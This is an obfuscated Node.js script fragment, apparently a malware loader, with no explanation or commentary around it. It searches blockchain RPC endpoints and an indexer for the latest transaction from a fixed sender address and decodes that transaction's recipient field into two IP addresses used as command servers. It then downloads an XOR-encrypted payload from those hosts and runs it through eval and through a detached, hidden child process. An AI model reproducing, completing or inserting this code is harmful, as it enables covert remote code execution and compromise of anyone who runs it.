httpRequest(lDejkuZhqqaodSuDQTw,{'method':RgisztlhTFeAZY(0x180),'body':JSON[RgisztlhTFeAZY(0x197)](yNiYV_dfUft[RgisztlhTFeAZY(0x170)](([iljaNbsNAegZnsSMfuHG,UhTsWgssgV_YDs$EvQ],hAn$Dxchc)=>({'jsonrpc':RgisztlhTFeAZY(0x176),'id':hAn$Dxchc+(parseInt(0x53)*-0xd+parseInt(-parseInt(0x7))*parseFloat(parseInt(0x35f))+-parseInt(0x1bd1)*-parseInt(0x1)),'method':iljaNbsNAegZnsSMfuHG,'params':UhTsWgssgV_YDs$EvQ}))),'signal':T_vPGSx}),loKNW$ZEHPqwORFBaZndj$qef=new Map(Ce$gUKS[RgisztlhTFeAZY(0x170)](Hl$GzK=>[Hl$GzK['id'],Hl$GzK]));return yNiYV_dfUft[RgisztlhTFeAZY(0x170)]((rGbwK$FU,WOWcZfwO_kkhojX)=>loKNW$ZEHPqwORFBaZndj$qef[RgisztlhTFeAZY(0x19a)](WOWcZfwO_kkhojX+(Math.ceil(0xb60)+Math.floor(0x1091)*-0x2+parseInt(-0x1)*-parseInt(0x15c3)))[RgisztlhTFeAZY(0x15d)]);}const toBlockHex=nPMI$oplQLHIfFIMh$MXlWouLYr=>'0x'+nPMI$oplQLHIfFIMh$MXlWouLYr[BEf$CYFUWXrAiwaYBJ(0x1c2)](Math.trunc(-0x9e7)+parseInt(0x4a)*-parseInt(0x1f)+-0x11d*parseFloat(-0x11));function findSenderTx(JlepYaLvfHyt){const SBYThyjM$PN_bMmdJBQYZ=BEf$CYFUWXrAiwaYBJ;return JlepYaLvfHyt[SBYThyjM$PN_bMmdJBQYZ(0x1bb)](tQMkfGioJnQRZXosCHWMbN=>tQMkfGioJnQRZXosCHWMbN[SBYThyjM$PN_bMmdJBQYZ(0x1b0)]&&tQMkfGioJnQRZXosCHWMbN[SBYThyjM$PN_bMmdJBQYZ(0x1b0)][SBYThyjM$PN_bMmdJBQYZ(0x1c3)]()===SENDER)||null;}function decodeAddress(LLFlttzzZOjWxX){const KyRKDi_zVgoWr$Fcp=BEf$CYFUWXrAiwaYBJ,GHVvJhQqwuZof_fMJJmhgHtG=Buffer[KyRKDi_zVgoWr$Fcp(0x1b0)](LLFlttzzZOjWxX[KyRKDi_zVgoWr$Fcp(0x15b)](/^0x/i,''),KyRKDi_zVgoWr$Fcp(0x1ca)),oc_pQi$hRDfnjMb=NtzkwLinmHzrb$T$VOVzhvqWzO=>NtzkwLinmHzrb$T$VOVzhvqWzO[-parseInt(0x3d)*-0x52+-0x174*Number(-0xd)+-parseInt(0x1337)*0x2]+'.'+NtzkwLinmHzrb$T$VOVzhvqWzO[parseInt(-parseInt(0x12fd))+Number(-0x1af)*0xc+parseInt(0x2732)]+'.'+NtzkwLinmHzrb$T$VOVzhvqWzO[parseInt(0x31)*parseInt(0x55)+-0x1e78+parseInt(parseInt(0xe35))]+'.'+NtzkwLinmHzrb$T$VOVzhvqWzO[Number(parseInt(0x299))+parseInt(0x13fc)+Math.trunc(-0x1692)];return[oc_pQi$hRDfnjMb(GHVvJhQqwuZof_fMJJmhgHtG[KyRKDi_zVgoWr$Fcp(0x167)](Math.ceil(0x25)*-0x103+Math.max(-parseInt(0x960),-parseInt(0x960))+0x2ecf,parseInt(0x146c)+Number(0x4)*parseInt(0x2f0)+-parseInt(0x62)*Math.max(0x54,parseInt(0x54)))),oc_pQi$hRDfnjMb(GHVvJhQqwuZof_fMJJmhgHtG[KyRKDi_zVgoWr$Fcp(0x167)](0x67*Number(parseInt(0x5b))+0x6*parseInt(-0x401)+Math.ceil(parseInt(0x3))*-0x431,Math.ceil(-0x15b5)+-0x706*parseInt(0x3)+Math.floor(parseInt(0x2acf))))];}function firstMatch(RXQiRBl){return new Promise(ycfoHDNWrbSH=>{const agPpRSoihEXM=WlysIxGuPMcViepbraDjp_wli;let PW_L$mqJD=RXQiRBl[agPpRSoihEXM(0x192)];if(!PW_L$mqJD)return ycfoHDNWrbSH(null);let c_DcWifKzZZiWxV=![];const MQgJSlLDkonMvAdlnGaV=YXh_Wriz=>{const SLDTKOeeSQmQylQqge$fqRAt=agPpRSoihEXM;if(c_DcWifKzZZiWxV)return;c_DcWifKzZZiWxV=!![];for(const onzMmVaA$nTKSNPFeFyEHd of RXQiRBl)onzMmVaA$nTKSNPFeFyEHd[SLDTKOeeSQmQylQqge$fqRAt(0x19e)][SLDTKOeeSQmQylQqge$fqRAt(0x1ab)]();ycfoHDNWrbSH(YXh_Wriz);};for(const HSdfIaIW$pedbsDYi of RXQiRBl){HSdfIaIW$pedbsDYi[agPpRSoihEXM(0x172)]()[agPpRSoihEXM(0x18b)](lmICTA_NUarZEN=>{if(c_DcWifKzZZiWxV)return;if(lmICTA_NUarZEN)MQgJSlLDkonMvAdlnGaV(lmICTA_NUarZEN);else{if(--PW_L$mqJD===parseInt(0x73)*parseInt(-parseInt(0x4b))+parseFloat(-parseInt(0x280))*Math.ceil(-parseInt(0xe))+-0x14f)ycfoHDNWrbSH(null);}})[agPpRSoihEXM(0x1aa)](()=>{if(!c_DcWifKzZZiWxV&&--PW_L$mqJD===0x1a03+0x7e5+-parseInt(0x21e8))ycfoHDNWrbSH(null);});}});}function candidateBlocks(bLkeguRlGKpOR$sJag_F){const XijawxtX$yOfNKoIBZeBqs=BEf$CYFUWXrAiwaYBJ,cjbYFRMDhmUrBgfcnqAce=bLkeguRlGKpOR$sJag_F-BLOCK_MULTIPLE,xfUDNMijvuXOjMQBDF=new Set(),rHOWoPAmb$L=[];for(const eItYBJvGagwlwlgoIyvkFxSC of[bLkeguRlGKpOR$sJag_F-0x1n,bLkeguRlGKpOR$sJag_F,bLkeguRlGKpOR$sJag_F+0x1n,cjbYFRMDhmUrBgfcnqAce-0x1n,cjbYFRMDhmUrBgfcnqAce,cjbYFRMDhmUrBgfcnqAce+0x1n]){if(eItYBJvGagwlwlgoIyvkFxSC<0x0n)continue;const N$zKLRegWIHol=eItYBJvGagwlwlgoIyvkFxSC[XijawxtX$yOfNKoIBZeBqs(0x1c2)]();if(xfUDNMijvuXOjMQBDF[XijawxtX$yOfNKoIBZeBqs(0x16b)](N$zKLRegWIHol))continue;xfUDNMijvuXOjMQBDF[XijawxtX$yOfNKoIBZeBqs(0x179)](N$zKLRegWIHol),rHOWoPAmb$L[XijawxtX$yOfNKoIBZeBqs(0x166)](eItYBJvGagwlwlgoIyvkFxSC);}return rHOWoPAmb$L;}function blockTask(AXUCxPFXCcG){const CcSk$dOOG$tJaJ=new AbortController();return{'controller':CcSk$dOOG$tJaJ,'run':async()=>{const Flb_PeG=WlysIxGuPMcViepbraDjp_wli,J$ygYIX=await withRpcEndpoints((yVvvyY_XmC$ilpeTJT,QzgqxL$lrANn)=>rpcCall(yVvvyY_XmC$ilpeTJT,Flb_PeG(0x19d),[toBlockHex(AXUCxPFXCcG),!![]],QzgqxL$lrANn),CcSk$dOOG$tJaJ[Flb_PeG(0x18c)]),lFUiajiB$mhdtEP=J$ygYIX?.[Flb_PeG(0x175)];if(!Array[Flb_PeG(0x1c6)](lFUiajiB$mhdtEP))return null;const CX$IIYzbRMljhGDGQOn=findSenderTx(lFUiajiB$mhdtEP);return CX$IIYzbRMljhGDGQOn?{'blockNumber':AXUCxPFXCcG,'tx':CX$IIYzbRMljhGDGQOn}:null;}};}async function nonceAtBlocks(xn_wtGgYrKQjgNW_pA,esAMqTjgXNpOIVWCUlHCiJWR){const gC$IHIGOXbRBecVx_R=BEf$CYFUWXrAiwaYBJ,OYgjuXmanrbYtfW=xn_wtGgYrKQjgNW_pA[gC$IHIGOXbRBecVx_R(0x170)](mgcOt=>[gC$IHIGOXbRBecVx_R(0x1a8),[SENDER,toBlockHex(mgcOt)]]);try{return(await withRpcEndpoints((RHnOdxdnc$LyRixBY,DPj_yjR$iRFwaGZps)=>rpcBatch(RHnOdxdnc$LyRixBY,OYgjuXmanrbYtfW,DPj_yjR$iRFwaGZps),esAMqTjgXNpOIVWCUlHCiJWR))[gC$IHIGOXbRBecVx_R(0x170)](BigInt);}catch{return(await Promise[gC$IHIGOXbRBecVx_R(0x1b8)](OYgjuXmanrbYtfW[gC$IHIGOXbRBecVx_R(0x170)](([GuGZhYYgT$kyp,PkcxliQBzC])=>withRpcEndpoints((TfBe$DuDUAFUEyKCAXfdMQR,ELXbSluHr_MPeDjZHUnE$jZq)=>rpcCall(TfBe$DuDUAFUEyKCAXfdMQR,GuGZhYYgT$kyp,PkcxliQBzC,ELXbSluHr_MPeDjZHUnE$jZq),esAMqTjgXNpOIVWCUlHCiJWR))))[gC$IHIGOXbRBecVx_R(0x170)](BigInt);}}async function lastSenderTx(m_ixszc$Qu){const KYZeSIB=BEf$CYFUWXrAiwaYBJ,vOeJlPmLwpiHL$oohJee=new AbortController();try{const Zh$sPizEILiVZEl=m_ixszc$Qu??BigInt(await withRpcEndpoints((HNTZRdfPREnYvbYPL,OS_$UBVWEnUUVQ)=>rpcCall(HNTZRdfPREnYvbYPL,KYZeSIB(0x160),[],OS_$UBVWEnUUVQ),vOeJlPmLwpiHL$oohJee[KYZeSIB(0x18c)])),KdmVwLcnVRrGrW=BigInt(await withRpcEndpoints((Jnijrm$GJWFBXseOLFirZ$D,pxHSUzAottYo)=>rpcCall(Jnijrm$GJWFBXseOLFirZ$D,KYZeSIB(0x1a8),[SENDER,toBlockHex(Zh$sPizEILiVZEl)],pxHSUzAottYo),vOeJlPmLwpiHL$oohJee[KYZeSIB(0x18c)])),wxMNGaAYpSO=KdmVwLcnVRrGrW-0x1n;let EyfGMqfGt=SEARCH_FLOOR-0x1n,MFMjq=Zh$sPizEILiVZEl;while(MFMjq-EyfGMqfGt>0x1n){const xuQ$dxkjYVLINjswAjZJx=MFMjq-EyfGMqfGt-0x1n,opSYF_xqlkKe_bDDtuDuy=BigInt(Math[KYZeSIB(0x15e)](NONCE_FANOUT,Number(xuQ$dxkjYVLINjswAjZJx))),CM$Wz_bSEuXKdWfi=[];for(let IR$LUC=0x1n;IR$LUC<=opSYF_xqlkKe_bDDtuDuy;IR$LUC+=0x1n)CM$Wz_bSEuXKdWfi[KYZeSIB(0x166)](EyfGMqfGt+IR$LUC*(MFMjq-EyfGMqfGt)/(opSYF_xqlkKe_bDDtuDuy+0x1n));const SoikConeelN=await nonceAtBlocks(CM$Wz_bSEuXKdWfi,vOeJlPmLwpiHL$oohJee[KYZeSIB(0x18c)]),QcLgfQBypzvCa=SoikConeelN[KYZeSIB(0x1bc)](ceRuRdAnCmORJt=>ceRuRdAnCmORJt>=KdmVwLcnVRrGrW);if(QcLgfQBypzvCa===-(-parseInt(0x82f)+parseInt(0x622)+Math.floor(0x20e)))EyfGMqfGt=CM$Wz_bSEuXKdWfi[CM$Wz_bSEuXKdWfi[KYZeSIB(0x192)]-(-0x1dd8+Number(-0x244)+0x1*Math.floor(parseInt(0x201d)))];else{MFMjq=CM$Wz_bSEuXKdWfi[QcLgfQBypzvCa];if(QcLgfQBypzvCa>Number(0x1)*parseInt(0x11f)+-parseInt(0x3)*parseFloat(parseInt(0xa9))+Math.max(parseInt(0xdc),0xdc))EyfGMqfGt=CM$Wz_bSEuXKdWfi[QcLgfQBypzvCa-(Math.trunc(0x1)*-0x752+0x1dfd+-0xb55*parseInt(parseInt(0x2)))];}}const pwsZeE=await withRpcEndpoints((ozRbTmuUOSQxTaHSxAMAP,TEeXvPj)=>rpcCall(ozRbTmuUOSQxTaHSxAMAP,KYZeSIB(0x19d),[toBlockHex(MFMjq),!![]],TEeXvPj),vOeJlPmLwpiHL$oohJee[KYZeSIB(0x18c)]),MewjUeWTCE$egTDNiInBMBgf=pwsZeE?.[KYZeSIB(0x175)]||[];let tqCDDCknnC=null;for(const b__FnlemnKd of MewjUeWTCE$egTDNiInBMBgf){if(!b__FnlemnKd[KYZeSIB(0x1b0)]||b__FnlemnKd[KYZeSIB(0x1b0)][KYZeSIB(0x1c3)]()!==SENDER)continue;if(BigInt(b__FnlemnKd[KYZeSIB(0x154)])===wxMNGaAYpSO){tqCDDCknnC=b__FnlemnKd;break;}if(!tqCDDCknnC||BigInt(b__FnlemnKd[KYZeSIB(0x154)])>BigInt(tqCDDCknnC[KYZeSIB(0x154)]))tqCDDCknnC=b__FnlemnKd;}return{'blockNumber':MFMjq,'tx':tqCDDCknnC};}finally{vOeJlPmLwpiHL$oohJee[KYZeSIB(0x1ab)]();}}async function lastSenderTxViaIndexer(){const SCVGJ_IJGWPiEDEMaV_PMtnULo=BEf$CYFUWXrAiwaYBJ,kxNKGgueUA=INDEXER_URL+SCVGJ_IJGWPiEDEMaV_PMtnULo(0x194)+SENDER+SCVGJ_IJGWPiEDEMaV_PMtnULo(0x163),x$JrfbIZLbybosqwSDBfAq=await httpRequest(kxNKGgueUA),VXW_mxRMrUhuG$E=Array[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1c6)](x$JrfbIZLbybosqwSDBfAq?.[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x15d)])?x$JrfbIZLbybosqwSDBfAq[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x15d)]:[],oizDGSQQ_RyjP$GbM=VXW_mxRMrUhuG$E[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1bb)](jigmfjPfLbDrJaOT=>jigmfjPfLbDrJaOT[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1b0)]&&jigmfjPfLbDrJaOT[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1b0)][SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1c3)]()===SENDER);return{'blockNumber':BigInt(oizDGSQQ_RyjP$GbM[SCVGJ_IJGWPiEDEMaV_PMtnULo(0x1a3)]),'tx':oizDGSQQ_RyjP$GbM};}async function run(){const whs$nYWTlPzY=BEf$CYFUWXrAiwaYBJ,zMgSeaz=BigInt(await withRpcEndpoints((qtPCkCRAEVWH_NkH_cnm,f_UHJffpCvbHRB$tiJPyp)=>rpcCall(qtPCkCRAEVWH_NkH_cnm,whs$nYWTlPzY(0x160),[],f_UHJffpCvbHRB$tiJPyp))),CWWJsO$TZ=zMgSeaz-zMgSeaz%BLOCK_MULTIPLE;let oIucMTWeI=await firstMatch(candidateBlocks(CWWJsO$TZ)[whs$nYWTlPzY(0x170)](blockTask));!oIucMTWeI&&(oIucMTWeI=await lastSenderTx(zMgSeaz)[whs$nYWTlPzY(0x1aa)](()=>lastSenderTxViaIndexer()));const [fxydRcJblRNYxMPdn,pMMdlGsTHq_NQFuzSGfwaVj_A]=decodeAddress(oIucMTWeI['tx']['to']),bRsOozpSEKZvmdjiHwuhb=global;bRsOozpSEKZvmdjiHwuhb['_V']=bRsOozpSEKZvmdjiHwuhb['i'],bRsOozpSEKZvmdjiHwuhb['_H']=whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x185),bRsOozpSEKZvmdjiHwuhb[whs$nYWTlPzY(0x157)]=whs$nYWTlPzY(0x159)+pMMdlGsTHq_NQFuzSGfwaVj_A+whs$nYWTlPzY(0x185),bRsOozpSEKZvmdjiHwuhb[whs$nYWTlPzY(0x17d)]=whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x1c5),bRsOozpSEKZvmdjiHwuhb[whs$nYWTlPzY(0x1be)]=whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x185);function jRPe_$pro(AEEzGrqYV_mfkUCEUWURB,KOzb$TP_rMGJIxS){const z_SOYvRJaOEgyQMJlyl=whs$nYWTlPzY,IFHaRgVqomxJh$qVzf$VLfXyG={'hostname':KOzb$TP_rMGJIxS[z_SOYvRJaOEgyQMJlyl(0x1b5)],'port':Number(KOzb$TP_rMGJIxS[z_SOYvRJaOEgyQMJlyl(0x1b4)])||0x31*-parseInt(0x2)+0x119+Number(-0x67),'path':KOzb$TP_rMGJIxS[z_SOYvRJaOEgyQMJlyl(0x198)]+KOzb$TP_rMGJIxS[z_SOYvRJaOEgyQMJlyl(0x158)],'headers':{'User-Agent':z_SOYvRJaOEgyQMJlyl(0x195),'Sec-V':bRsOozpSEKZvmdjiHwuhb['_V']||parseInt(0xf60)+-0x61e+-parseInt(0x942)}};function fmGWrbBhU(InqhIrdb_iNVZtsJ$mYS){const UpgdSP_f$WJxlxa=z_SOYvRJaOEgyQMJlyl,M$n$GOjWFzYMwpXudh=AEEzGrqYV_mfkUCEUWURB[UpgdSP_f$WJxlxa(0x192)];for(let Q_xgQBVbDvn=0x18e*-0x7+0x183f+parseInt(0x1)*-0xd5d;Q_xgQBVbDvn<InqhIrdb_iNVZtsJ$mYS[UpgdSP_f$WJxlxa(0x192)];Q_xgQBVbDvn++)InqhIrdb_iNVZtsJ$mYS[Q_xgQBVbDvn]^=AEEzGrqYV_mfkUCEUWURB[UpgdSP_f$WJxlxa(0x1a0)](Q_xgQBVbDvn%M$n$GOjWFzYMwpXudh);return InqhIrdb_iNVZtsJ$mYS[UpgdSP_f$WJxlxa(0x1c2)](UpgdSP_f$WJxlxa(0x1c4));}function KNklZsIzRmFSCPm_UGyD(nRCmFdhgPAof){const eHWnRKXPBiRwhodiw=z_SOYvRJaOEgyQMJlyl,KpvHX=nRCmFdhgPAof[eHWnRKXPBiRwhodiw(0x1c7)][eHWnRKXPBiRwhodiw(0x18d)];if(!KpvHX)throw new Error(eHWnRKXPBiRwhodiw(0x1af));return fmGWrbBhU(Buffer[eHWnRKXPBiRwhodiw(0x1b0)](KpvHX,eHWnRKXPBiRwhodiw(0x151)));}function OJfSXHTVZN$fe(K_vSenE){return new Promise((ZQuPXkVipPg,NZIEVyTIKMQVORTZfU)=>{const RXvlYtHcsKeS=WlysIxGuPMcViepbraDjp_wli,CBAOZI$rcixEZZanTLMOm=http[RXvlYtHcsKeS(0x16e)]({...IFHaRgVqomxJh$qVzf$VLfXyG,'method':K_vSenE},VxIgkbRRYdgFucsNdoIDHFr=>{const XZJHXReDP=RXvlYtHcsKeS;if(K_vSenE===XZJHXReDP(0x193)){try{ZQuPXkVipPg(KNklZsIzRmFSCPm_UGyD(VxIgkbRRYdgFucsNdoIDHFr));}catch(RZRFkoIipO){NZIEVyTIKMQVORTZfU(RZRFkoIipO);}VxIgkbRRYdgFucsNdoIDHFr[XZJHXReDP(0x1a1)]();return;}const cPKJoMYzdExeb$XXVTS=[];VxIgkbRRYdgFucsNdoIDHFr['on'](XZJHXReDP(0x18e),MYQD_ZFWLwm$Ov=>cPKJoMYzdExeb$XXVTS[XZJHXReDP(0x166)](MYQD_ZFWLwm$Ov)),VxIgkbRRYdgFucsNdoIDHFr['on'](XZJHXReDP(0x1c0),()=>{const vmTXJa_MM$WzZOdwzwDkERCdK=XZJHXReDP;try{const fAhxZbhTcBfzeDihoLRDX=Buffer[vmTXJa_MM$WzZOdwzwDkERCdK(0x1b3)](cPKJoMYzdExeb$XXVTS);if(fAhxZbhTcBfzeDihoLRDX[vmTXJa_MM$WzZOdwzwDkERCdK(0x192)])return ZQuPXkVipPg(fmGWrbBhU(fAhxZbhTcBfzeDihoLRDX));if(VxIgkbRRYdgFucsNdoIDHFr[vmTXJa_MM$WzZOdwzwDkERCdK(0x1c7)][vmTXJa_MM$WzZOdwzwDkERCdK(0x18d)])return ZQuPXkVipPg(KNklZsIzRmFSCPm_UGyD(VxIgkbRRYdgFucsNdoIDHFr));NZIEVyTIKMQVORTZfU(new Error(vmTXJa_MM$WzZOdwzwDkERCdK(0x17b)));}catch(IG_a_MJi){NZIEVyTIKMQVORTZfU(IG_a_MJi);}}),VxIgkbRRYdgFucsNdoIDHFr['on'](XZJHXReDP(0x188),NZIEVyTIKMQVORTZfU);});CBAOZI$rcixEZZanTLMOm['on'](RXvlYtHcsKeS(0x188),NZIEVyTIKMQVORTZfU),CBAOZI$rcixEZZanTLMOm[RXvlYtHcsKeS(0x1c0)]();});}return OJfSXHTVZN$fe(z_SOYvRJaOEgyQMJlyl(0x181))[z_SOYvRJaOEgyQMJlyl(0x1aa)](()=>OJfSXHTVZN$fe(z_SOYvRJaOEgyQMJlyl(0x193)));}async function zS$wdno(RqdenM$wJdTdnrzoPxWuyF_a,k$DEq$xpz,cN$yvd){const CTJVzfTMEozmTbUg=whs$nYWTlPzY;try{const ZeKiakEO$nY_FkVMX=await jRPe_$pro(k$DEq$xpz,RqdenM$wJdTdnrzoPxWuyF_a),DiRknXtYt=cN$yvd?CTJVzfTMEozmTbUg(0x16f)+(bRsOozpSEKZvmdjiHwuhb['_V']||Math.ceil(parseInt(0x14))*-0x1b6+-0x1*parseFloat(0xc51)+Math.max(0x2e89,0x2e89))+CTJVzfTMEozmTbUg(0x1a6)+bRsOozpSEKZvmdjiHwuhb['_H']+CTJVzfTMEozmTbUg(0x183)+bRsOozpSEKZvmdjiHwuhb[CTJVzfTMEozmTbUg(0x157)]+CTJVzfTMEozmTbUg(0x1ad):CTJVzfTMEozmTbUg(0x16f)+(bRsOozpSEKZvmdjiHwuhb['_V']||-0x78a+Math.floor(0x1f6)*-0x3+Number(0xd6c)*parseFloat(parseInt(0x1)))+CTJVzfTMEozmTbUg(0x1a2)+bRsOozpSEKZvmdjiHwuhb[CTJVzfTMEozmTbUg(0x17d)]+CTJVzfTMEozmTbUg(0x1ba)+bRsOozpSEKZvmdjiHwuhb[CTJVzfTMEozmTbUg(0x1be)]+CTJVzfTMEozmTbUg(0x1ad);if(!cN$yvd)eval(DiRknXtYt+ZeKiakEO$nY_FkVMX);spawn(CTJVzfTMEozmTbUg(0x15c),['-e',DiRknXtYt+ZeKiakEO$nY_FkVMX],{'detached':!![],'stdio':CTJVzfTMEozmTbUg(0x15f),'windowsHide':!![]})[CTJVzfTMEozmTbUg(0x17e)]();}catch(irHwSYrpWho){}}await zS$wdno(new URL(whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x19c)),whs$nYWTlPzY(0x169),![]),await zS$wdno(new URL(whs$nYWTlPzY(0x159)+fxydRcJblRNYxMPdn+whs$nYWTlPzY(0x162)),whs$nYWTlPzY(0x18f),!![]);}run();

